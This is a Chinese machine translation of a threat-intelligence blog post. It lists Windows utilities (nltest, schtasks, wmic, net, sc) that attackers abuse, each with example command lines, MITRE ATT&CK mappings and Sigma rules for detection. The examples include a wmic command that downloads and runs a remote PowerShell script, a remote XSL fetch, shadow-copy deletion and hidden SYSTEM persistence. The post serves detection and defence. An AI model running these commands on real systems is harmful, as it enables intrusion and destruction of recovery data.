<html>
<head>
<title>Common Tools &amp; Techniques Used By Threat Actors and Malware — Part I</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">威胁参与者和恶意软件使用的常用工具和技术—第一部分</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/common-tools-techniques-used-by-threat-actors-and-malware-part-i-deb05b664879?source=collection_archive---------0-----------------------#2021-01-23">https://infosecwriteups.com/common-tools-techniques-used-by-threat-actors-and-malware-part-i-deb05b664879?source=collection_archive---------0-----------------------#2021-01-23</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/3392f18aa10dfa5b44bed514dd7da962.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*jESkdKPF1eDVAtpt"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">照片由<a class="ae kc" href="https://unsplash.com/@the_roaming_platypus?utm_source=medium&amp;utm_medium=referral" rel="noopener ugc nofollow" target="_blank"> timJ </a>在<a class="ae kc" href="https://unsplash.com?utm_source=medium&amp;utm_medium=referral" rel="noopener ugc nofollow" target="_blank"> Unsplash </a>上拍摄</figcaption></figure><p id="66d8" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">如果你一直关注信息安全领域，哪怕只关注一点点，你肯定听说过最近发生在太阳风猎户座产品中的供应链攻击。这是一次真正复杂的攻击，展示了一个有决心、有耐心、有技能的团队所能做的事情。</p><p id="6915" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">人们对“旭日”后门使用的技术和策略进行了大量的研究，并发表了大量的博客文章对其进行了极其详细的描述。</p><p id="00b8" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">但是CrowdStrike最近发表的一篇名为<strong class="kf ir">“黑子:构建过程中的植入物”</strong>的博客文章详细描述了威胁参与者如何能够将“阳光爆发”后门注入网络安全管理软件产品猎户座IT管理产品的源代码。</p><div class="lb lc gp gr ld le"><a href="https://www.crowdstrike.com/blog/sunspot-malware-technical-analysis/" rel="noopener  ugc nofollow" target="_blank"><div class="lf ab fo"><div class="lg ab lh cl cj li"><h2 class="bd ir gy z fp lj fr fs lk fu fw ip bi translated">黑子恶意软件:技术分析</h2><div class="ll l"><h3 class="bd b gy z fp lj fr fs lk fu fw dk translated">2020年12月，针对网络安全管理软件产品公司的复杂供应链攻击的披露震惊了整个行业</h3></div><div class="lm l"><p class="bd b dl z fp lj fr fs lk fu fw dk translated">www.crowdstrike.com</p></div></div><div class="ln l"><div class="lo l lp lq lr ln ls jw le"/></div></div></a></div><p id="7890" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">虽然博客本身是一个引人入胜的读物，你一定要看看。让我“惊讶”的一件事是两种技术的使用。</p><p id="84bf" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">第一个是使用<strong class="kf ir">计划任务实用程序</strong>的持久性，第二个是以典型的恶意软件方式放入磁盘<strong class="kf ir"> (C:\Windows\Temp\) </strong>的日志文件。</p><p id="ba70" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">这让我想到，如果即使是最老练的攻击者仍然使用这样的技术和工具。然后，总有希望抓到他们。</p><p id="69f4" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">所以在这篇博文中，我想我会写一些最近几年恶意软件和威胁者使用的最常见的技术、实用工具和命令行参数。</p><p id="51fa" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">为此，我回过头来阅读了大约60篇最近的博文和评论，分别来自于<strong class="kf ir"/><em class="lt"/><a class="ae kc" href="https://www.fireeye.com/blog.html" rel="noopener ugc nofollow" target="_blank"><em class="lt">火眼</em></a><em class="lt"/><a class="ae kc" href="https://thedfirreport.com/" rel="noopener ugc nofollow" target="_blank"><em class="lt">the dfirreport</em></a><em class="lt">】、</em><a class="ae kc" href="https://www.crowdstrike.com/" rel="noopener ugc nofollow" target="_blank"><em class="lt">crowd strike</em></a><em class="lt">、</em><a class="ae kc" href="https://redcanary.com/blog/" rel="noopener ugc nofollow" target="_blank"><em class="lt">red canary</em></a><em class="lt">、<em class="lt">并搜索最近上传到网站的恶意软件，如<em class="lt">"</em><a class="ae kc" href="https://any.run/" rel="noopener ugc nofollow" target="_blank"><em class="lt">any . run</em></a><em class="lt">"，</em><a class="ae kc" href="https://www.hybrid-analysis.com/" rel="noopener ugc nofollow" target="_blank"><em class="lt">hybrid-analysis</em></a><em class="lt">"，</em> <a class="ae kc" href="https://labs.inquest.net/" rel="noopener ugc nofollow" target="_blank"> <em class="lt">研讯</em></a><em class="lt"/>和<em class="lt"/><a class="ae kc" href="http://tria.ge/" rel="noopener ugc nofollow" target="_blank"><em class="lt">tria . ge</em></a><em class="lt"/></em></em></p><p id="3ab7" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kf ir"> <em class="lt">注意:这两部分系列的第一部分将主要关注工具和它们的命令行参数。诸如进程注入、进程中空化、命名管道等技术。将在第二部分讨论。</em> </strong></p><h1 id="d6e3" class="lu lv iq bd lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr bi translated">Windows实用程序(LoLBins)</h1><p id="7634" class="pw-post-body-paragraph kd ke iq kf b kg ms ki kj kk mt km kn ko mu kq kr ks mv ku kv kw mw ky kz la ij bi translated">这绝对不会让任何人感到震惊。windows实用程序是恶意软件和威胁参与者使用最广泛的工具之一。从发现和横向移动到坚持。以下是近年来最常见的，排名不分先后。</p><h1 id="b244" class="lu lv iq bd lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr bi translated">nltest(nltest.exe)</h1><blockquote class="mx my mz"><p id="215a" class="kd ke lt kf b kg kh ki kj kk kl km kn na kp kq kr nb kt ku kv nc kx ky kz la ij bi translated">网络位置测试—列出域控制器(DC)，强制远程关机，查询信任状态，测试信任关系和域控制器复制的状态。— <a class="ae kc" href="https://ss64.com/nt/nltest.html" rel="noopener ugc nofollow" target="_blank"> <strong class="kf ir"> ss64 </strong> </a></p></blockquote><p id="1f2f" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">如上所述，威胁参与者经常使用该工具通过<strong class="kf ir">“domain _ trust”</strong>和<strong class="kf ir">“DC list”</strong>枚举活动目录信任和域控制器</p><p id="8c8b" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">最常见的论点如下:</p><ul class=""><li id="362b" class="nd ne iq kf b kg kh kk kl ko nf ks ng kw nh la ni nj nk nl bi translated">/DOMAIN_TRUSTS —在<servername>上查询域信任</servername></li><li id="67f2" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated">/DCLIST: <domainname> —获取<domainname>的DC列表</domainname></domainname></li></ul><pre class="nr ns nt nu gt nv nw nx ny aw nz bi"><span id="0044" class="oa lv iq nw b gy ob oc l od oe"><strong class="nw ir">nltest /domain_trusts<br/>nltest /domain_trusts /all_trusts<br/>nltest /dclist:"[DOMAIN]"</strong></span></pre><h2 id="f2f5" class="oa lv iq bd lw of og dn ma oh oi dp me ko oj ok mi ks ol om mm kw on oo mq op bi translated">相关的斜接技术</h2><p id="4377" class="pw-post-body-paragraph kd ke iq kf b kg ms ki kj kk mt km kn ko mu kq kr ks mv ku kv kw mw ky kz la ij bi translated">以下来自<strong class="kf ir">米特ATT &amp; CK </strong>的技术与此工具相关</p><ul class=""><li id="4d18" class="nd ne iq kf b kg kh kk kl ko nf ks ng kw nh la ni nj nk nl bi translated"><a class="ae kc" href="https://attack.mitre.org/techniques/T1482" rel="noopener ugc nofollow" target="_blank"> T1482 —域信任发现</a></li><li id="4113" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><a class="ae kc" href="https://attack.mitre.org/techniques/T1018" rel="noopener ugc nofollow" target="_blank"> T1018 —远程系统发现</a></li><li id="9a9f" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><a class="ae kc" href="https://attack.mitre.org/techniques/T1016" rel="noopener ugc nofollow" target="_blank"> T1016 —系统网络配置发现</a></li></ul><h2 id="5655" class="oa lv iq bd lw of og dn ma oh oi dp me ko oj ok mi ks ol om mm kw on oo mq op bi translated"><strong class="ak">西格玛规则</strong></h2><p id="3b99" class="pw-post-body-paragraph kd ke iq kf b kg ms ki kj kk mt km kn ko mu kq kr ks mv ku kv kw mw ky kz la ij bi translated">您可以使用以下sigma规则来检测该工具:</p><ul class=""><li id="a095" class="nd ne iq kf b kg kh kk kl ko nf ks ng kw nh la ni nj nk nl bi translated">win_trust_discovery.yml</li></ul><h1 id="8781" class="lu lv iq bd lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr bi translated">施塔克斯(schtasks.exe)</h1><blockquote class="mx my mz"><p id="c143" class="kd ke lt kf b kg kh ki kj kk kl km kn na kp kq kr nb kt ku kv nc kx ky kz la ij bi translated">使管理员能够在本地或远程计算机上创建、删除、查询、更改、运行和结束计划任务— <a class="ae kc" href="https://docs.microsoft.com/en-us/windows/win32/taskschd/schtasks" rel="noopener ugc nofollow" target="_blank"> MSDN </a></p></blockquote><p id="82eb" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">被恶意软件和威胁参与者用作在系统上持续存在的手段。以下是最常见的论点及其含义。</p><ul class=""><li id="ff41" class="nd ne iq kf b kg kh kk kl ko nf ks ng kw nh la ni nj nk nl bi translated"><strong class="kf ir">/创建:</strong>创建一个调度任务。</li><li id="7e2a" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><strong class="kf ir"> /tn(任务名称):</strong>指定唯一标识计划任务的名称的值。</li><li id="0580" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><strong class="kf ir"> /sc (schedule) : </strong>指定调度频率的值。有效值包括:分钟、每小时、每天、每周、每月、一次、登录、ONIDLE和ONEVENT。</li><li id="f7d0" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><strong class="kf ir"> /mo(修改量):</strong>细化计划类型的值，以便更好地控制计划重复。有效值包括:</li><li id="5230" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><strong class="kf ir"> /tr (taskrun) : </strong>一个值，指定要在计划时间运行的任务的路径和文件名。</li><li id="9a92" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><strong class="kf ir"> /ru (runasuser) : </strong>指定任务运行的用户上下文的值。</li><li id="da0b" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><strong class="kf ir"> /run : </strong>用于立即运行已调度的任务。</li><li id="4cd4" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><strong class="kf ir"> /f (force) : </strong>强制创建任务的值，如果指定的任务已经存在，则取消警告。</li><li id="9bd6" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><strong class="kf ir"> /rl (level) : </strong>设置任务运行级别的值。有效值是有限的和最高的。默认值是有限的。</li><li id="b63d" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><strong class="kf ir"> /st (starttime) : </strong>指定运行任务的开始时间的值。时间格式为HH:mm (24小时制)。</li><li id="9ce5" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><strong class="kf ir"> /XML (xmlfile) : </strong>从XML文件创建任务的值</li><li id="5bfd" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><strong class="kf ir">/删除:</strong>删除一个调度任务</li><li id="ebdb" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><strong class="kf ir"> /S : </strong>指定要连接的远程计算机的值。如果省略，系统参数默认为本地计算机。</li><li id="c182" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><strong class="kf ir"> /end: </strong>停止正在运行的计划任务。</li></ul><p id="d3f8" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">以下是恶意软件/威胁行为者如何执行该实用程序几个示例。</p><pre class="nr ns nt nu gt nv nw nx ny aw nz bi"><span id="f6b6" class="oa lv iq nw b gy ob oc l od oe">SCHTASKS /create /tn [TASK NAME] /sc HOURLY /mo 1 /tr "cmd /c sc config [Service Name] start=AUTO&amp;net start [Service Name]"  /ru "NT AUTHORITY\SYSTEM" &amp; SCHTASKS /run /tn [TASK NAME]</span><span id="9413" class="oa lv iq nw b gy oq oc l od oe">schtasks /create /tn [TASK NAME] /tr "C:\Windows\system32\mshta.exe C:\ProgramData\malicious.hta" /sc onlogon /ru System /f</span><span id="a0d6" class="oa lv iq nw b gy oq oc l od oe">schtasks.exe /Create /SC MINUTE /TN [TASK NAME] /TR "PowerShell.exe -ExecutionPolicy bypass -windowstyle hidden -File C:\Users\Administrator\redacted.ps1" /MO 30 /F</span><span id="05c0" class="oa lv iq nw b gy oq oc l od oe">schtasks /CREATE /SC ONSTART /TN [TASK NAME] /TR "'C:\Users\redacted.exe'" /f</span><span id="914e" class="oa lv iq nw b gy oq oc l od oe">schtasks /CREATE /SC ONCE /ST 17:21:58 /TN [TASK NAME] /TR "'C:\Users\redacted.exe'" /f /RL HIGHEST</span><span id="4aa8" class="oa lv iq nw b gy oq oc l od oe">schtasks.exe /CREATE /XML C:\Windows\TEMP\redacted.xml /TN [TASK NAME] /F</span><span id="604d" class="oa lv iq nw b gy oq oc l od oe">SCHTASKS /Delete /TN * /F</span><span id="2660" class="oa lv iq nw b gy oq oc l od oe">schtasks /tn [TASK NAME] /end</span><span id="7982" class="oa lv iq nw b gy oq oc l od oe">schtasks /create /tn [TASK NAME] /tr "c:\windows\temp\redacted.bat" /sc ONCE /st 00:00 /F /RU System /S [Remote Host]</span></pre><h2 id="53d8" class="oa lv iq bd lw of og dn ma oh oi dp me ko oj ok mi ks ol om mm kw on oo mq op bi translated">相关的斜接技术</h2><p id="3d64" class="pw-post-body-paragraph kd ke iq kf b kg ms ki kj kk mt km kn ko mu kq kr ks mv ku kv kw mw ky kz la ij bi translated">以下来自<strong class="kf ir">米特ATT &amp; CK </strong>的技术与该工具相关</p><ul class=""><li id="34eb" class="nd ne iq kf b kg kh kk kl ko nf ks ng kw nh la ni nj nk nl bi translated"><a class="ae kc" href="https://attack.mitre.org/techniques/T1053/005/" rel="noopener ugc nofollow" target="_blank"> T1053.005 —预定任务/作业:预定任务</a></li></ul><h2 id="535f" class="oa lv iq bd lw of og dn ma oh oi dp me ko oj ok mi ks ol om mm kw on oo mq op bi translated">西格玛规则</h2><p id="5585" class="pw-post-body-paragraph kd ke iq kf b kg ms ki kj kk mt km kn ko mu kq kr ks mv ku kv kw mw ky kz la ij bi translated">您可以使用以下sigma规则来检测该工具:</p><ul class=""><li id="ad11" class="nd ne iq kf b kg kh kk kl ko nf ks ng kw nh la ni nj nk nl bi translated">win_susp_schtask_creation.yml</li><li id="db34" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated">win_rare_schtask_creation.yml</li><li id="bfe4" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated">win _ powersploit _ empire _ schtasks . yml</li></ul><h1 id="4775" class="lu lv iq bd lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr bi translated">wmic(wmic.exe)</h1><blockquote class="mx my mz"><p id="bfd2" class="kd ke lt kf b kg kh ki kj kk kl km kn na kp kq kr nb kt ku kv nc kx ky kz la ij bi translated">WMI命令行(WMIC)实用程序为Windows Management Instrumentation(WMI)——<a class="ae kc" href="https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmic" rel="noopener ugc nofollow" target="_blank">MSDN</a>提供了命令行界面</p></blockquote><p id="b655" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">攻击者以许多不同的方式使用这个工具。您可以终止进程、搜索进程、删除卷影副本、本地或远程执行进程等等(实际上是无限)。这里有几个关于如何使用这个工具例子</p><pre class="nr ns nt nu gt nv nw nx ny aw nz bi"><span id="2142" class="oa lv iq nw b gy ob oc l od oe">wmic /node:"Remote @IP" process call create "Malicious File"</span><span id="9307" class="oa lv iq nw b gy oq oc l od oe">wmic process where "name like '%$process%'" delete</span><span id="4f87" class="oa lv iq nw b gy oq oc l od oe">wmic.exe shadowcopy delete</span><span id="7783" class="oa lv iq nw b gy oq oc l od oe">wmic process where ExecutablePath='Path to executable' delete</span><span id="705b" class="oa lv iq nw b gy oq oc l od oe">wmic /NODE:"COMPUTER NAME" /USER:"username" /PASSWORD:"password" process call create "powershell.exe -Command {IEX (New-Object   Net.Webclient).DownloadString('http://@IP/redacted.ps1')}"</span><span id="196f" class="oa lv iq nw b gy oq oc l od oe">wmic.exe process get brief /format:"\\127.0.0.1\c$\Tools\pocremote.xsl"</span><span id="0def" class="oa lv iq nw b gy oq oc l od oe">wmic os get /FORMAT:"https[:]//example[.]com/evil[.]xsl"</span></pre><p id="4d6c" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">请注意，WMI经常被威胁者和恶意软件使用。《WMIC》只是故事的一半。你可以用WMI和powershell做神奇的事情。</p><p id="a906" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我强烈建议你阅读更多关于这个和最近利用WMI的攻击。</p><h2 id="bb46" class="oa lv iq bd lw of og dn ma oh oi dp me ko oj ok mi ks ol om mm kw on oo mq op bi translated">相关的斜接技术</h2><p id="5891" class="pw-post-body-paragraph kd ke iq kf b kg ms ki kj kk mt km kn ko mu kq kr ks mv ku kv kw mw ky kz la ij bi translated">以下来自<strong class="kf ir">米特ATT &amp; CK </strong>的技术与此工具相关</p><ul class=""><li id="f305" class="nd ne iq kf b kg kh kk kl ko nf ks ng kw nh la ni nj nk nl bi translated"><a class="ae kc" href="https://attack.mitre.org/techniques/T1518/001/" rel="noopener ugc nofollow" target="_blank"> T1518.001 —软件发现:安全软件发现</a></li><li id="1caf" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><a class="ae kc" href="https://attack.mitre.org/techniques/T1490/" rel="noopener ugc nofollow" target="_blank"> T1490 —抑制系统恢复</a></li><li id="199d" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><a class="ae kc" href="https://attack.mitre.org/techniques/T1047/" rel="noopener ugc nofollow" target="_blank"> T1047 — Windows管理规范</a></li><li id="29f5" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><a class="ae kc" href="https://attack.mitre.org/techniques/T1220/" rel="noopener ugc nofollow" target="_blank"> T1220 — XSL脚本处理</a></li><li id="2a85" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><a class="ae kc" href="https://attack.mitre.org/techniques/T1078/003/" rel="noopener ugc nofollow" target="_blank"> T1078.003 —有效账户:本地账户</a></li><li id="b563" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><a class="ae kc" href="https://attack.mitre.org/techniques/T1057/" rel="noopener ugc nofollow" target="_blank"> T1057 —进程发现</a></li></ul><h2 id="081d" class="oa lv iq bd lw of og dn ma oh oi dp me ko oj ok mi ks ol om mm kw on oo mq op bi translated">西格玛规则</h2><p id="b539" class="pw-post-body-paragraph kd ke iq kf b kg ms ki kj kk mt km kn ko mu kq kr ks mv ku kv kw mw ky kz la ij bi translated">根据执行的上下文，您可以使用多个sigma规则来检测“wmic”的用法，下面是几个示例:</p><ul class=""><li id="bbe5" class="nd ne iq kf b kg kh kk kl ko nf ks ng kw nh la ni nj nk nl bi translated">win_susp_wmi_execution.yml</li><li id="fcb5" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated">win_xsl_script_processing.yml</li><li id="5d39" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated">win_susp_eventlog_clear.yml</li></ul><h1 id="4bc4" class="lu lv iq bd lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr bi translated">网络(net.exe)</h1><blockquote class="mx my mz"><p id="12e9" class="kd ke lt kf b kg kh ki kj kk kl km kn na kp kq kr nb kt ku kv nc kx ky kz la ij bi translated">Net.exe实用程序组件是一个命令行工具，用于控制用户、组、服务和网络连接。— <a class="ae kc" href="https://docs.microsoft.com/en-us/previous-versions/windows/embedded/aa939914(v=winembedded.5)?redirectedfrom=MSDN" rel="noopener ugc nofollow" target="_blank"> MSDN </a></p></blockquote><p id="3ae5" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">该实用程序可用于查看共享、创建用户和组、发现、查看密码策略等。以下是威胁参与者和恶意软件执行的一些命令:</p><pre class="nr ns nt nu gt nv nw nx ny aw nz bi"><span id="38e3" class="oa lv iq nw b gy ob oc l od oe">net user</span><span id="c5b1" class="oa lv iq nw b gy oq oc l od oe">net group "domain admins" /domain</span><span id="7a38" class="oa lv iq nw b gy oq oc l od oe">net group "enterprise admins" /domain</span><span id="8a8a" class="oa lv iq nw b gy oq oc l od oe">net group "Domain Users" /domain</span><span id="1603" class="oa lv iq nw b gy oq oc l od oe">net view</span><span id="d221" class="oa lv iq nw b gy oq oc l od oe">net view /all /domain</span><span id="c170" class="oa lv iq nw b gy oq oc l od oe">net /stop [Service] /y</span><span id="dd46" class="oa lv iq nw b gy oq oc l od oe">net share</span><span id="8c4c" class="oa lv iq nw b gy oq oc l od oe">net users</span><span id="3637" class="oa lv iq nw b gy oq oc l od oe">net use</span><span id="9f54" class="oa lv iq nw b gy oq oc l od oe">net use q: \\DomainController\DomainName /user:DomainName\administrator [Password]</span><span id="1ddf" class="oa lv iq nw b gy oq oc l od oe">net config workstation</span><span id="1c0c" class="oa lv iq nw b gy oq oc l od oe">net localgroup users</span><span id="9548" class="oa lv iq nw b gy oq oc l od oe">net localgroup /domain</span></pre><h2 id="136a" class="oa lv iq bd lw of og dn ma oh oi dp me ko oj ok mi ks ol om mm kw on oo mq op bi translated">相关的斜接技术</h2><p id="8421" class="pw-post-body-paragraph kd ke iq kf b kg ms ki kj kk mt km kn ko mu kq kr ks mv ku kv kw mw ky kz la ij bi translated">以下来自<strong class="kf ir">米特ATT &amp; CK </strong>的技术与该工具相关</p><ul class=""><li id="b621" class="nd ne iq kf b kg kh kk kl ko nf ks ng kw nh la ni nj nk nl bi translated"><a class="ae kc" href="https://attack.mitre.org/techniques/T1087/001" rel="noopener ugc nofollow" target="_blank"> T1087.001帐户发现:本地帐户</a></li><li id="bbba" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><a class="ae kc" href="https://attack.mitre.org/techniques/T1087/002" rel="noopener ugc nofollow" target="_blank"> T1087.002帐户发现:域帐户</a></li><li id="1a1c" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><a class="ae kc" href="https://attack.mitre.org/techniques/T1136/001" rel="noopener ugc nofollow" target="_blank"> T1136.001创建账户:本地账户</a></li><li id="f750" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><a class="ae kc" href="https://attack.mitre.org/techniques/T1136/002" rel="noopener ugc nofollow" target="_blank"> T1136.002创建账户:域账户</a></li><li id="8119" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><a class="ae kc" href="https://attack.mitre.org/techniques/T1070/005" rel="noopener ugc nofollow" target="_blank"> T1070.005主机上的指示器移除:网络共享连接移除</a></li><li id="8e22" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><a class="ae kc" href="https://attack.mitre.org/techniques/T1135" rel="noopener ugc nofollow" target="_blank"> T1135网络共享发现</a></li><li id="81a9" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><a class="ae kc" href="https://attack.mitre.org/techniques/T1201" rel="noopener ugc nofollow" target="_blank"> T1201密码策略发现</a></li><li id="0fcd" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><a class="ae kc" href="https://attack.mitre.org/techniques/T1069/001" rel="noopener ugc nofollow" target="_blank"> T1069.001权限组发现:本地组</a></li><li id="df57" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><a class="ae kc" href="https://attack.mitre.org/techniques/T1069/002" rel="noopener ugc nofollow" target="_blank"> T1069.002权限组发现:域组</a></li><li id="8ecf" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><a class="ae kc" href="https://attack.mitre.org/techniques/T1021/002" rel="noopener ugc nofollow" target="_blank"> T1021.002远程服务:中小企业/Windows管理共享</a></li><li id="1fed" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><a class="ae kc" href="https://attack.mitre.org/techniques/T1018" rel="noopener ugc nofollow" target="_blank"> T1018远程系统发现</a></li><li id="61dc" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><a class="ae kc" href="https://attack.mitre.org/techniques/T1049" rel="noopener ugc nofollow" target="_blank"> T1049系统网络连接发现</a></li><li id="d82f" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><a class="ae kc" href="https://attack.mitre.org/techniques/T1007" rel="noopener ugc nofollow" target="_blank"> T1007系统服务发现</a></li><li id="26c1" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><a class="ae kc" href="https://attack.mitre.org/techniques/T1569/002" rel="noopener ugc nofollow" target="_blank"> T1569.002系统服务:服务执行</a></li><li id="4789" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><a class="ae kc" href="https://attack.mitre.org/techniques/T1124" rel="noopener ugc nofollow" target="_blank"> T1124系统时间发现</a></li></ul><h1 id="52ca" class="lu lv iq bd lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr bi translated">sc(sc.exe)</h1><blockquote class="mx my mz"><p id="4869" class="kd ke lt kf b kg kh ki kj kk kl km kn na kp kq kr nb kt ku kv nc kx ky kz la ij bi translated">与服务控制器和已安装的服务进行通信— <a class="ae kc" href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754599(v=ws.11)" rel="noopener ugc nofollow" target="_blank"> MSDN </a></p></blockquote><p id="a1e6" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">被攻击者用来禁用、创建、删除或停止服务。以下是最常见的论点。</p><ul class=""><li id="2ac9" class="nd ne iq kf b kg kh kk kl ko nf ks ng kw nh la ni nj nk nl bi translated"><strong class="kf ir">创建:</strong>在注册表和服务控制管理器数据库中为服务创建子项和条目。</li><li id="58c2" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><strong class="kf ir"> Config : </strong>修改注册表和服务控制管理器数据库中服务条目的值。</li><li id="a7e7" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><strong class="kf ir">删除:</strong>从注册表中删除一个服务子项。如果服务正在运行，或者如果另一个进程打开了该服务的句柄，则该服务将被标记为删除</li><li id="9030" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><strong class="kf ir">停止:</strong>向服务发送停止控制请求。</li></ul><pre class="nr ns nt nu gt nv nw nx ny aw nz bi"><span id="3573" class="oa lv iq nw b gy ob oc l od oe">sc config [Service] start= Disabled</span><span id="4ad5" class="oa lv iq nw b gy oq oc l od oe">sc config [Service] binPath= "Malicious Command"</span><span id="8064" class="oa lv iq nw b gy oq oc l od oe">sc delete [Service]</span><span id="0f58" class="oa lv iq nw b gy oq oc l od oe">sc start [Service] </span><span id="e73a" class="oa lv iq nw b gy oq oc l od oe">sc stop [Service]</span><span id="8402" class="oa lv iq nw b gy oq oc l od oe">sc create [Redacted] binPath="Path" DisplayName= "Redacted" start= auto</span></pre><h2 id="07e0" class="oa lv iq bd lw of og dn ma oh oi dp me ko oj ok mi ks ol om mm kw on oo mq op bi translated">相关的斜接技术</h2><p id="2841" class="pw-post-body-paragraph kd ke iq kf b kg ms 